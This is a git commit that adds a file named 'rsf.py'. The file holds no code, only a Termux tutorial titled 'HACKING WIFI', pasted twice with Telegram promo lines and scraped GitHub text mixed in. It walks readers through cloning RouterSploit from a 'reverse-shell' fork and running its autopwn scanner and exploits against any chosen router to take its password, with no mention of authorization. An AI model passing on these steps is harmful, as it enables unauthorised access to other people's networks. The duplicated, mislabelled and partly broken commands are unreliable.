7fa6daadc349c90f91f9133a46158134661c9170
Lodart * 17 <101147277+Lodart17@users.noreply.github.com>
2022-03-08 15:20:32 +0700

    HACKING WIFI
    TRY IT

---
+++ python rsf.py
@@ -0,0 +1,121 @@
+ pkg update && pkg upgrade
+
+$ pkg install python -y
+
+$ pkg install python2 -y 
+[Here python2 have no any work but when you download and install routersploit you get many errors. So solve many errors problem you can download python2]
+
+$ pkg install git
+
+$ pkg install pip
+
+$ git clone https://github.com/reverse-shell/routersploit
+[  Copy this link 👉 https://github.com/reverse-shell/routersploit ]
+
+ $ ls
+
+ $ cd routersploit
+
+ $ pip2 install -r requirement.txt
+
+ $ pip2 install requests
+[ It will be taken few minutes for install. Don't skip it ]
+
+ $ pip install future
+
+ $ python rsf.py
+[ Then routersploit tool is install successfully]
+
+
+@TermuxForAndroidBot             https://t.me/Termux_For_Android
+
+Now your routersploit tool is ready for use. 
+
+rsf > show all
+
+rsf > use scanners/autopwn
+
+rsf > show options
+
+rsf > set target { your ip}
+[ For get ip, go to settings>wifi 
+Then copy ip of router which you want to use]
+
+rsf > set http_port 80 vulnerability
+
+rsf > run
+ Now you vulnerability process get start. This process take few minutes to scan Vulnerability to this router. After scan Vulnerability you can copy this password which interface is like [+]
+Then give commands
+
+rsf > use {your vulnerability text }
+
+rsf > set target {router IP } 
+
+rsf > run
+
+
+@TermuxForAndroidBot                 https://t.me/Termux_For_Android
+GitHub
+GitHub - threat9/routersploit: Exploitation Framework for Embedded Devices
+Exploitation Framework for Embedded Devices. Contribute to threat9/routersploit development by creating an account on GitHub.
+HACK WIFI USING ROUTERSPLOIT IN TERMUX
+
+HOW TO DOWNLOAD AND INSTALL ROUTERSPLOIT  ON TERMUX?
+After successfully download and install Termux give these following commands
+                                                                                
+$ pkg update && pkg upgrade
+
+$ pkg install python -y
+
+$ pkg install python2 -y 
+[Here python2 have no any work but when you download and install routersploit you get many errors. So solve many errors problem you can download python2]
+
+$ pkg install git
+
+$ pkg install pip
+
+$ git clone https://github.com/reverse-shell/routersploit
+[  Copy this link 👉 https://github.com/reverse-shell/routersploit ]
+
+ $ ls
+
+ $ cd routersploit
+
+ $ pip2 install -r requirement.txt
+
+ $ pip2 install requests
+[ It will be taken few minutes for install. Don't skip it ]
+
+ $ pip install future
+
+ $ python rsf.py
+[ Then routersploit tool is install successfully]
+
+
+@TermuxForAndroidBot             https://t.me/Termux_For_Android
+
+Now your routersploit tool is ready for use. 
+
+rsf > show all
+
+rsf > use scanners/autopwn
+
+rsf > show options
+
+rsf > set target { your ip}
+[ For get ip, go to settings>wifi 
+Then copy ip of router which you want to use]
+
+rsf > set http_port 80 vulnerability
+
+rsf > run
+ Now you vulnerability process get start. This process take few minutes to scan Vulnerability to this router. After scan Vulnerability you can copy this password which interface is like [+]
+Then give commands
+
+rsf > use {your vulnerability text }
+
+rsf > set target {router IP } 
+
+rsf > run
+
+
